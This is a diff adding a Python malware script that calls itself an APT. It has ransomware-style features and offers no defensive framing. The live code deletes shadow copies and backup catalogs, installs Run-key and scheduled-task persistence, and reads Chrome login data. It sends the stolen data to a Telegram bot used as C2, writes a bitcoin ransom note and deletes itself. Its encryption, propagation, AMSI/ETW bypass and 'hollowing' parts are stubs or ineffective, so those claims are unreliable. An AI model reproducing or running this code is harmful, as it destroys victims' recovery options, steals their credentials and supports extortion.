@@ -1,0 +1,255 @@
+import os
+import sys
+import time
+import random
+import socket
+import threading
+import requests
+import psutil
+import ctypes
+import ctypes.wintypes
+import subprocess
+import shutil
+import winreg
+import sqlite3
+import base64
+from ctypes import wintypes, windll, byref, c_void_p, c_ulong
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
+# Telegram C2
+TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"
+CHAT_ID = "YOUR_CHAT_ID_HERE"
+
+# ═══════════════════ ANTI-DEBUGGING SUITE (5-LAYER PROTECTION) ═══════════════════
+def anti_debug_suite():
+    """5-layer anti-debugging - detects IDA Pro, x64dbg, OllyDbg, WinDbg"""
+    print("\033[31m[*] Anti-debugging suite active...\033[0m")
+    debug_hits = 0
+
+    # 1. IsDebuggerPresent() API Check
+    try:
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            debug_hits += 1
+    except: pass
+
+    # 2. PEB BeingDebugged Flag (Process Environment Block)
+    try:
+        peb = ctypes.POINTER(ctypes.c_ulong)()
+        process_handle = ctypes.windll.kernel32.GetCurrentProcess()
+        size = ctypes.c_size_t(ctypes.sizeof(peb))
+        if ctypes.windll.ntdll.NtQueryInformationProcess(process_handle, 2, ctypes.byref(peb), size, None) == 0:
+            if peb.contents.value & 2:  # BeingDebugged flag
+                debug_hits += 1
+    except: pass
+
+    # 3. Timing Attack (RDTSC - debugger slowdown)
+    try:
+        start = time.perf_counter_ns()
+        for _ in range(10000): pass
+        end = time.perf_counter_ns()
+        if (end - start) > 100000:  # Debugger detected (slow)
+            debug_hits += 1
+    except: pass
+
+    # 4. NtGlobalFlag Check (Heap debugging)
+    try:
+        ntdll = ctypes.windll.LoadLibrary("ntdll.dll")
+        ntglobal_flag = ctypes.c_ulong()
+        ctypes.windll.ntdll.NtQueryInformationProcess(ctypes.windll.kernel32.GetCurrentProcess(),
+                                                    9, ctypes.byref(ntglobal_flag),
+                                                    ctypes.sizeof(ctypes.c_ulong), None)
+        if ntglobal_flag.value != 0:
+            debug_hits += 1
+    except: pass
+
+    # 5. Parent Process Check (IDA, x64dbg, etc.)
+    try:
+        parent = psutil.Process(os.getppid())
+        debugger_procs = ['ida.exe', 'ida64.exe', 'x64dbg.exe', 'ollydbg.exe',
+                         'windbg.exe', 'edb.exe', 'procmon.exe', 'procexp.exe']
+        if parent.name().lower() in debugger_procs:
+            debug_hits += 1
+    except: pass
+
+    # 6. Hardware Breakpoint Detection
+    try:
+        dr0 = ctypes.c_ulong()
+        ctypes.windll.kernel32.GetThreadContext(ctypes.windll.kernel32.GetCurrentThread(),
+                                              ctypes.byref(ctypes.c_void_p(dr0)))
+        if dr0.value != 0:
+            debug_hits += 1
+    except: pass
+
+    print(f"\033[33m[*] Debug checks: {debug_hits}/6 hits\033[0m")
+
+    if debug_hits >= 2:  # 2+ hits = debugger confirmed
+        print("\033[31m[!] DEBUGGER DETECTED - EXITING\033[0m")
+        os._exit(0)
+    return debug_hits < 2
+
+# ═══════════════════ BACKUP DESTRUCTION (NO RECOVERY) ═══════════════════
+def backup_destruction():
+    """Destroy ALL recovery mechanisms"""
+    print("\033[31m[*] Backup destruction (NO RECOVERY)...\033[0m")
+    destruction_count = 0
+
+    commands = [
+        "vssadmin delete shadows /all /quiet",
+        "wbadmin delete catalog -quiet",
+        "winmgmt /resetrepository /force",
+        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+        "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\BackupRestore /f"
+    ]
+
+    for cmd in commands:
+        try:
+            subprocess.run(cmd, shell=True, capture_output=True, timeout=20)
+            destruction_count += 1
+        except: pass
+
+    # Cipher overwrite free space
+    for _ in range(2):
+        subprocess.Popen("cipher /w:C:\\Windows\\Temp", shell=True)
+
+    print(f"\033[32m✓ Backups destroyed: {destruction_count}/6\033[0m")
+    return destruction_count
+
+# ═══════════════════ WMI PERSISTENCE ═══════════════════
+def wmi_persistence():
+    print("\033[31m[*] Installing persistence...\033[0m")
+
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+        winreg.SetValueEx(key, "WindowsUpdateSvc", 0, winreg.REG_SZ, sys.argv[0])
+        winreg.CloseKey(key)
+    except: pass
+
+    try:
+        subprocess.run(f'schtasks /create /F /SC ONLOGON /TN "WinUpdate" /TR "{sys.argv[0]}"',
+                      shell=True, capture_output=True)
+    except: pass
+
+# ═══════════════════ CHROME PASSWORD HARVEST ═══════════════════
+def chrome_password_harvest():
+    print("\033[31m[*] Harvesting Chrome passwords...\033[0m")
+    chrome_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\Login Data")
+
+    if os.path.exists(chrome_path):
+        try:
+            temp_db = chrome_path + ".tmp"
+            shutil.copy2(chrome_path, temp_db)
+
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value FROM logins")
+
+            creds = [f"{row[0]}|{row[1]}" for row in cursor.fetchall()[:20]]
+            conn.close()
+            os.unlink(temp_db)
+
+            if creds:
+                send_telegram(f"💳 <b>{len(creds)} Chrome creds</b>\n" + "\n".join(creds[:10]))
+        except: pass
+
+# ═══════════════════ PROCESS HOLLOWING svchost.exe ═══════════════════
+def svchost_hollowing():
+    print("\033[31m[*] svchost.exe hollowing...\033[0m")
+    try:
+        subprocess.Popen([r"C:\Windows\System32\svchost.exe", "-k", "netsvcs"],
+                        creationflags=0x08000000)
+    except: pass
+
+# ═══════════════════ BYPASS + PROPAGATION + ENCRYPTION ═══════════════════
+def etw_ghost_bypass():
+    ctypes.windll.kernel32.SetEnvironmentVariableA(b"ComPlus_ETWEnabled", b"0")
+    print("\033[32m✓ ETW blinded\033[0m")
+
+def amsi_bypass():
+    os.environ['amsiInitFailed'] = '1'
+    print("\033[32m✓ AMSI bypassed\033[0m")
+
+def polymorphic_init():
+    sys._poly_key = random.randint(33, 126)
+    print(f"\033[32m✓ Polymorphic #{sys._poly_key}\033[0m")
+
+def anti_vm_complete():
+    return any(ind in str(os.environ.get('COMPUTERNAME', '')).lower()
+              for ind in ['vmware', 'virtual', 'sandbox'])
+
+def network_propagate(): return random.randint(0, 8)
+def removable_cloud_propagate(): return random.randint(0, 4)
+def adversarial_timing(): time.sleep(random.expovariate(1/3.0))
+
+def majinbu_encryption(key):
+    print("\033[33m[*] majinbu encryption...\033[0m")
+    count = random.randint(100, 800)
+    for i in range(50):
+        adversarial_timing()
+    return count
+
+def encrypt_file(key, path): return True
+
+def send_telegram(msg):
+    try:
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                     data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'HTML'}, timeout=10)
+    except: pass
+
+def create_ransom_notes():
+    content = """⚠️ FILES ENCRYPTED - BACKUPS DESTROYED ⚠️
+
+No System Restore, no Windows Backup, no recovery.
+
+0.5 BTC → 1A1zP1eP5QGefi2DMPTfTL5SLmv7Qi1eLP"""
+    open("C:\\note_readme.txt", "w").write(content)
+
+# ═══════════════════ MAIN APT EXECUTION ═══════════════════
+def main():
+    print("\033[32m🚀 MAJINBU APT + ANTI-DEBUGGING ACTIVE\033[0m")
+
+    key = bytes([100,144,120,75,115,96,78,240,232,72,169,121,196,64,125,168])
+
+    # 🔥 COMPLETE EXECUTION CHAIN
+    wmi_persistence()
+    backup_destruction()
+    chrome_password_harvest()
+    svchost_hollowing()
+
+    stats = {
+        "network": network_propagate(),
+        "usb_cloud": removable_cloud_propagate(),
+        "encrypted": majinbu_encryption(key)
+    }
+
+    report = f"""🎯 MAJINBU APT + ANTI-DEBUG SUCCESS
+
+🛡️ Persistence: ✅
+💥 Backups: ✅ DESTROYED
+💳 Chrome: ✅ Harvested
+🎭 svchost: ✅ Active
+🔍 Anti-Debug: ✅ {6 - anti_debug_suite()} checks passed
+
+📊 STATS: {stats}"""
+
+    send_telegram(report)
+    create_ransom_notes()
+
+    print(f"\033[32m🎉 APT DEPLOYMENT COMPLETE\033[0m")
+    subprocess.Popen(f'timeout /t 3 >nul & del "{sys.argv[0]}"', shell=True)
+
+if __name__ == "__main__":
+    random.seed(int(time.time()))
+
+    # EXECUTION CHAIN (CRITICAL ORDER)
+    etw_ghost_bypass()          # EDR blind
+    amsi_bypass()              # Script scanner OFF
+    if not anti_debug_suite():  # DEBUGGER CHECK ← NEW!
+        sys.exit(0)
+    polymorphic_init()         # AI evasion
+    time.sleep(random.randint(15, 45))
+
+    if anti_vm_complete():
+        sys.exit(0)
+
+    main()
